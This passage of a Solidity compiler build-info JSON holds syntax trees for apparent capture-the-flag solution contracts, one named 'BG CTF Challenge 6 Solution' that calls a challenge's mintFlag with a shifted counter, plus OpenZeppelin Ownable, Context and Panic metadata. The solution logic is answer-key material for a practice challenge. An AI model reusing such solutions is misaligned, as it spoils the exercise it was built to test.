external"}},"id":5751,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"593:23:12","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":5752,"nodeType":"ExpressionStatement","src":"593:23:12"}]}}]},"id":5756,"implemented":true,"kind":"receive","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":5740,"nodeType":"ParameterList","parameters":[],"src":"467:2:12"},"returnParameters":{"id":5741,"nodeType":"ParameterList","parameters":[],"src":"487:0:12"},"scope":5761,"src":"460:173:12","stateMutability":"payable","virtual":false,"visibility":"external"},{"body":{"id":5759,"nodeType":"Block","src":"659:267:12","statements":[]},"id":5760,"implemented":true,"kind":"fallback","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":5757,"nodeType":"ParameterList","parameters":[],"src":"647:2:12"},"returnParameters":{"id":5758,"nodeType":"ParameterList","parameters":[],"src":"659:0:12"},"scope":5761,"src":"639:287:12","stateMutability":"nonpayable","virtual":false,"visibility":"external"}],"scope":5772,"src":"65:863:12","usedErrors":[],"usedEvents":[5712,5714]},{"abstract":false,"baseContracts":[],"canonicalName":"IChallenge5","contractDependencies":[],"contractKind":"interface","fullyImplemented":false,"id":5771,"linearizedBaseContracts":[5771],"name":"IChallenge5","nameLocation":"941:11:12","nodeType":"ContractDefinition","nodes":[{"functionSelector":"04d092c7","id":5764,"implemented":false,"kind":"function","modifiers":[],"name":"claimPoints","nameLocation":"968:11:12","nodeType":"FunctionDefinition","parameters":{"id":5762,"nodeType":"ParameterList","parameters":[],"src":"979:2:12"},"returnParameters":{"id":5763,"nodeType":"ParameterList","parameters":[],"src":"990:0:12"},"scope":5771,"src":"959:32:12","stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"functionSelector":"e00d023f","id":5767,"implemented":false,"kind":"function","modifiers":[],"name":"mintFlag","nameLocation":"1005:8:12","nodeType":"FunctionDefinition","parameters":{"id":5765,"nodeType":"ParameterList","parameters":[],"src":"1013:2:12"},"returnParameters":{"id":5766,"nodeType":"ParameterList","parameters":[],"src":"1024:0:12"},"scope":5771,"src":"996:29:12","stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"functionSelector":"1e4696ae","id":5770,"implemented":false,"kind":"function","modifiers":[],"name":"resetPoints","nameLocation":"1039:11:12","nodeType":"FunctionDefinition","parameters":{"id":5768,"nodeType":"ParameterList","parameters":[],"src":"1050:2:12"},"returnParameters":{"id":5769,"nodeType":"ParameterList","parameters":[],"src":"1061:0:12"},"scope":5771,"src":"1030:32:12","stateMutability":"nonpayable","virtual":false,"visibility":"external"}],"scope":5772,"src":"931:133:12","usedErrors":[],"usedEvents":[]}],"src":"39:1025:12"},"id":12},"contracts/CtfChallenge6.sol":{"ast":{"absolutePath":"contracts/CtfChallenge6.sol","exportedSymbols":{"CtfChallenge6":[5813],"IChallenge6":[5824]},"id":5825,"license":"UNLICENSED","nodeType":"SourceUnit","nodes":[{"id":5773,"literals":["solidity","^","0.8",".28"],"nodeType":"PragmaDirective","src":"39:24:13"},{"abstract":false,"baseContracts":[],"canonicalName":"CtfChallenge6","contractDependencies":[],"contractKind":"contract","fullyImplemented":true,"id":5813,"linearizedBaseContracts":[5813],"name":"CtfChallenge6","nameLocation":"74:13:13","nodeType":"ContractDefinition","nodes":[{"constant":false,"functionSelector":"d2ef7398","id":5776,"mutability":"mutable","name":"challenge","nameLocation":"113:9:13","nodeType":"VariableDeclaration","scope":5813,"src":"94:28:13","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_contract$_IChallenge6_$5824","typeString":"contract IChallenge6"},"typeName":{"id":5775,"nodeType":"UserDefinedTypeName","pathNode":{"id":5774,"name":"IChallenge6","nameLocations":["94:11:13"],"nodeType":"IdentifierPath","referencedDeclaration":5824,"src":"94:11:13"},"referencedDeclaration":5824,"src":"94:11:13","typeDescriptions":{"typeIdentifier":"t_contract$_IChallenge6_$5824","typeString":"contract IChallenge6"}},"visibility":"public"},{"constant":false,"functionSelector":"06fdde03","id":5778,"mutability":"mutable","name":"name","nameLocation":"142:4:13","nodeType":"VariableDeclaration","scope":5813,"src":"128:18:13","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string"},"typeName":{"id":5777,"name":"string","nodeType":"ElementaryTypeName","src":"128:6:13","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"public"},{"body":{"id":5793,"nodeType":"Block","src":"193:105:13","statements":[{"expression":{"id":5787,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5783,"name":"challenge","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5776,"src":"203:9:13","typeDescriptions":{"typeIdentifier":"t_contract$_IChallenge6_$5824","typeString":"contract IChallenge6"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":5785,"name":"_challengeAddress","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5780,"src":"227:17:13","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":5784,"name":"IChallenge6","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5824,"src":"215:11:13","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_IChallenge6_$5824_$","typeString":"type(contract IChallenge6)"}},"id":5786,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"215:30:13","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_contract$_IChallenge6_$5824","typeString":"contract IChallenge6"}},"src":"203:42:13","typeDescriptions":{"typeIdentifier":"t_contract$_IChallenge6_$5824","typeString":"contract IChallenge6"}},"id":5788,"nodeType":"ExpressionStatement","src":"203:42:13"},{"expression":{"id":5791,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":5789,"name":"name","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5778,"src":"255:4:13","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string storage ref"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"424720435446204368616c6c656e6765203620536f6c7574696f6e","id":5790,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"262:29:13","typeDescriptions":{"typeIdentifier":"t_stringliteral_49166efdf3c8787fa7930087d925ab312b232cfc4fc1785f46d4d2269635a409","typeString":"literal_string \"BG CTF Challenge 6 Solution\""},"value":"BG CTF Challenge 6 Solution"},"src":"255:36:13","typeDescriptions":{"typeIdentifier":"t_string_storage","typeString":"string storage ref"}},"id":5792,"nodeType":"ExpressionStatement","src":"255:36:13"}]},"id":5794,"implemented":true,"kind":"constructor","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":5781,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5780,"mutability":"mutable","name":"_challengeAddress","nameLocation":"174:17:13","nodeType":"VariableDeclaration","scope":5794,"src":"166:25:13","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":5779,"name":"address","nodeType":"ElementaryTypeName","src":"166:7:13","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"165:27:13"},"returnParameters":{"id":5782,"nodeType":"ParameterList","parameters":[],"src":"193:0:13"},"scope":5813,"src":"154:144:13","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"body":{"id":5811,"nodeType":"Block","src":"334:90:13","statements":[{"assignments":[5798],"declarations":[{"constant":false,"id":5798,"mutability":"mutable","name":"count","nameLocation":"352:5:13","nodeType":"VariableDeclaration","scope":5811,"src":"344:13:13","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":5797,"name":"uint256","nodeType":"ElementaryTypeName","src":"344:7:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":5802,"initialValue":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"id":5799,"name":"challenge","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5776,"src":"360:9:13","typeDescriptions":{"typeIdentifier":"t_contract$_IChallenge6_$5824","typeString":"contract IChallenge6"}},"id":5800,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"370:5:13","memberName":"count","nodeType":"MemberAccess","referencedDeclaration":5818,"src":"360:15:13","typeDescriptions":{"typeIdentifier":"t_function_external_view$__$returns$_t_uint256_$","typeString":"function () view external returns (uint256)"}},"id":5801,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"360:17:13","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"344:33:13"},{"expression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":5808,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":5806,"name":"count","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5798,"src":"406:5:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"38","id":5807,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"415:1:13","typeDescriptions":{"typeIdentifier":"t_rational_8_by_1","typeString":"int_const 8"},"value":"8"},"src":"406:10:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":5803,"name":"challenge","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5776,"src":"387:9:13","typeDescriptions":{"typeIdentifier":"t_contract$_IChallenge6_$5824","typeString":"contract IChallenge6"}},"id":5805,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"397:8:13","memberName":"mintFlag","nodeType":"MemberAccess","referencedDeclaration":5823,"src":"387:18:13","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$_t_uint256_$returns$__$","typeString":"function (uint256) external"}},"id":5809,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"387:30:13","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":5810,"nodeType":"ExpressionStatement","src":"387:30:13"}]},"functionSelector":"2be09561","id":5812,"implemented":true,"kind":"function","modifiers":[],"name":"startMint","nameLocation":"313:9:13","nodeType":"FunctionDefinition","parameters":{"id":5795,"nodeType":"ParameterList","parameters":[],"src":"322:2:13"},"returnParameters":{"id":5796,"nodeType":"ParameterList","parameters":[],"src":"334:0:13"},"scope":5813,"src":"304:120:13","stateMutability":"nonpayable","virtual":false,"visibility":"external"}],"scope":5825,"src":"65:361:13","usedErrors":[],"usedEvents":[]},{"abstract":false,"baseContracts":[],"canonicalName":"IChallenge6","contractDependencies":[],"contractKind":"interface","fullyImplemented":false,"id":5824,"linearizedBaseContracts":[5824],"name":"IChallenge6","nameLocation":"439:11:13","nodeType":"ContractDefinition","nodes":[{"functionSelector":"06661abd","id":5818,"implemented":false,"kind":"function","modifiers":[],"name":"count","nameLocation":"466:5:13","nodeType":"FunctionDefinition","parameters":{"id":5814,"nodeType":"ParameterList","parameters":[],"src":"471:2:13"},"returnParameters":{"id":5817,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5816,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":5818,"src":"497:7:13","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":5815,"name":"uint256","nodeType":"ElementaryTypeName","src":"497:7:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"496:9:13"},"scope":5824,"src":"457:49:13","stateMutability":"view","virtual":false,"visibility":"external"},{"functionSelector":"23df6bd6","id":5823,"implemented":false,"kind":"function","modifiers":[],"name":"mintFlag","nameLocation":"520:8:13","nodeType":"FunctionDefinition","parameters":{"id":5821,"nodeType":"ParameterList","parameters":[{"constant":false,"id":5820,"mutability":"mutable","name":"_count","nameLocation":"537:6:13","nodeType":"VariableDeclaration","scope":5823,"src":"529:14:13","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":5819,"name":"uint256","nodeType":"ElementaryTypeName","src":"529:7:13","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"528:16:13"},"returnParameters":{"id":5822,"nodeType":"ParameterList","parameters":[],"src":"553:0:13"},"scope":5824,"src":"511:43:13","stateMutability":"nonpayable","virtual":false,"visibility":"external"}],"scope":5825,"src":"429:127:13","usedErrors":[],"usedEvents":[]}],"src":"39:517:13"},"id":13}},"contracts":{"@openzeppelin/contracts/access/Ownable.sol":{"Ownable":{"abi":[{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"OwnableInvalidOwner","type":"error"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"OwnableUnauthorizedAccount","type":"error"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"details":"Contract module which provides a basic access control mechanism, where there is an account (an owner) that can be granted exclusive access to specific functions. The initial owner is set to the address provided by the deployer. This can later be changed with {transferOwnership}. This module is used through inheritance. It will make available the modifier `onlyOwner`, which can be applied to your functions to restrict their use to the owner.","errors":{"OwnableInvalidOwner(address)":[{"details":"The owner is not a valid owner account. (eg. `address(0)`)"}],"OwnableUnauthorizedAccount(address)":[{"details":"The caller account is not authorized to perform an operation."}]},"kind":"dev","methods":{"constructor":{"details":"Initializes the contract setting the address provided by the deployer as the initial owner."},"owner()":{"details":"Returns the address of the current owner."},"renounceOwnership()":{"details":"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner."},"transferOwnership(address)":{"details":"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."}},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{"owner()":"8da5cb5b","renounceOwnership()":"715018a6","transferOwnership(address)":"f2fde38b"}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnableInvalidOwner\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"OwnableUnauthorizedAccount\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Contract module which provides a basic access control mechanism, where there is an account (an owner) that can be granted exclusive access to specific functions. The initial owner is set to the address provided by the deployer. This can later be changed with {transferOwnership}. This module is used through inheritance. It will make available the modifier `onlyOwner`, which can be applied to your functions to restrict their use to the owner.\",\"errors\":{\"OwnableInvalidOwner(address)\":[{\"details\":\"The owner is not a valid owner account. (eg. `address(0)`)\"}],\"OwnableUnauthorizedAccount(address)\":[{\"details\":\"The caller account is not authorized to perform an operation.\"}]},\"kind\":\"dev\",\"methods\":{\"constructor\":{\"details\":\"Initializes the contract setting the address provided by the deployer as the initial owner.\"},\"owner()\":{\"details\":\"Returns the address of the current owner.\"},\"renounceOwnership()\":{\"details\":\"Leaves the contract without owner. It will not be possible to call `onlyOwner` functions. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby disabling any functionality that is only available to the owner.\"},\"transferOwnership(address)\":{\"details\":\"Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/access/Ownable.sol\":\"Ownable\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/access/Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {Context} from \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * The initial owner is set to the address provided by the deployer. This can\\n * later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    /**\\n     * @dev The caller account is not authorized to perform an operation.\\n     */\\n    error OwnableUnauthorizedAccount(address account);\\n\\n    /**\\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\\n     */\\n    error OwnableInvalidOwner(address owner);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\n     */\\n    constructor(address initialOwner) {\\n        if (initialOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(initialOwner);\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        if (owner() != _msgSender()) {\\n            revert OwnableUnauthorizedAccount(_msgSender());\\n        }\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        if (newOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\",\"keccak256\":\"0xff6d0bb2e285473e5311d9d3caacb525ae3538a80758c10649a4d61029b017bb\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n\\n    function _contextSuffixLength() internal view virtual returns (uint256) {\\n        return 0;\\n    }\\n}\\n\",\"keccak256\":\"0x493033a8d1b176a037b2cc6a04dad01a5c157722049bbecf632ca876224dd4b2\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[{"astId":8,"contract":"@openzeppelin/contracts/access/Ownable.sol:Ownable","label":"_owner","offset":0,"slot":"0","type":"t_address"}],"types":{"t_address":{"encoding":"inplace","label":"address","numberOfBytes":"20"}}},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/utils/Context.sol":{"Context":{"abi":[],"devdoc":{"details":"Provides information about the current execution context, including the sender of the transaction and its data. While these are generally available via msg.sender and msg.data, they should not be accessed in such a direct manner, since when dealing with meta-transactions the account sending and paying for execution may not be the actual sender (as far as an application is concerned). This contract is only required for intermediate, library-like contracts.","kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Provides information about the current execution context, including the sender of the transaction and its data. While these are generally available via msg.sender and msg.data, they should not be accessed in such a direct manner, since when dealing with meta-transactions the account sending and paying for execution may not be the actual sender (as far as an application is concerned). This contract is only required for intermediate, library-like contracts.\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/utils/Context.sol\":\"Context\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n\\n    function _contextSuffixLength() internal view virtual returns (uint256) {\\n        return 0;\\n    }\\n}\\n\",\"keccak256\":\"0x493033a8d1b176a037b2cc6a04dad01a5c157722049bbecf632ca876224dd4b2\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/utils/Panic.sol":{"Panic":{"abi":[],"devdoc":{"details":"Helper library for emitting standardized panic codes. ```solidity contract Example {      using Panic for uint256;      // Use any of the declared internal constants      function foo() { Panic.GENERIC.panic(); }      // Alternatively      function foo() { Panic.panic(Panic.GENERIC); } } ``` Follows the list from https://github.com/ethereum/solidity/blob/v0.8.24/libsolutil/ErrorCodes.h[libsolutil]. _Available since v5.1._","kind":"dev","methods":{},"stateVariables":{"ARRAY_OUT_OF_BOUNDS":{"details":"array out of bounds access"},"ASSERT":{"details":"used by the assert() builtin"},"DIVISION_BY_ZERO":{"details":"division or modulo by zero"},"EMPTY_ARRAY_POP":{"details":"empty array pop"},"ENUM_CONVERSION_ERROR":{"details":"enum conversion error"},"GENERIC":{"details":"generic / unspecified error"},"INVALID_INTERNAL_FUNCTION":{"details":"calling invalid internal function"},"RESOURCE_ERROR":{"details":"resource error (too large allocation or too large array)"},"STORAGE_ENCODING_ERROR":{"details":"invalid encoding in storage"},"UNDER_OVERFLOW":{"details":"arithmetic underflow or overflow"}},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"60566050600b82828239805160001a6073146043577f4e487b7100000000000000000000000000000000000000000000000000000000600052600060045260246000fd5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220ffcd4ada2b643b0c5ee11b43b20ff1adc228447f2d4e33d65f3bb35a34d7dded64736f6c634300081c0033","opcodes":"PUSH1 0x56 PUSH1 0x50 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x43 JUMPI PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x0 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SELFDESTRUCT 0xCD BLOBBASEFEE 0xDA 0x2B PUSH5 0x3B0C5EE11B NUMBER 0xB2 0xF CALL 0xAD 0xC2 0x28 PREVRANDAO PUSH32 0x2D4E33D65F3BB35A34D7DDED64736F6C634300081C0033000000000000000000 ","sourceMap":"657:1315:2:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220ffcd4ada2b643b0c5ee11b43b20ff1adc228447f2d4e33d65f3bb35a34d7dded64736f6c634300081c0033","opcodes":"PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SELFDESTRUCT 0xCD BLOBBASEFEE 0xDA 0x2B PUSH5 0x3B0C5EE11B NUMBER 0xB2 0xF CALL 0xAD 0xC2 0x28 PREVRANDAO PUSH32 0x2D4E33D65F3BB35A34D7DDED64736F6C634300081C0033000000000000000000 ","sourceMap":"657:1315:2:-:0;;;;;;;;"},"gasEstimates":{"creation":{"codeDepositCost":"17200","executionCost":"97","totalCost":"17297"},"internal":{"panic(uint256)":"infinite"}},"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Helper library for emitting standardized panic codes. ```solidity contract Example {      using Panic for uint256;      // Use any of the declared internal constants      function foo() { Panic.GENERIC.panic(); }      // Alternatively      function foo() { Panic.panic(Panic.GENERIC); } } ``` Follows the list from https://github.com/ethereum/solidity/blob/v0.8.24/libsolutil/ErrorCodes.h[libsolutil]. _Available since v5.1._\",\"kind\":\"dev\",\"methods\":{},\"stateVariables\":{\"ARRAY_OUT_OF_BOUNDS\":{\"details\":\"array out of bounds access\"},\"ASSERT\":{\"details\":\"used by the assert() builtin\"},\"DIVISION_BY_ZERO\":{\"details\":\"division or modulo by zero\"},\"EMPTY_ARRAY_POP\":{\"details\":\"empty array pop\"},\"ENUM_CONVERSION_ERROR\":{\"details\":\"enum conversion error\"},\"GENERIC\":{\"details\":\"generic / unspecified error\"},\"INVALID_INTERNAL_FUNCTION\":{\"details\":\"calling invalid internal function\"},\"RESOURCE_ERROR\":{\"details\":\"resource error (too large allocation or too large array)\"},\"STORAGE_ENCODING_ERROR\":{\"details\":\"invalid encoding in 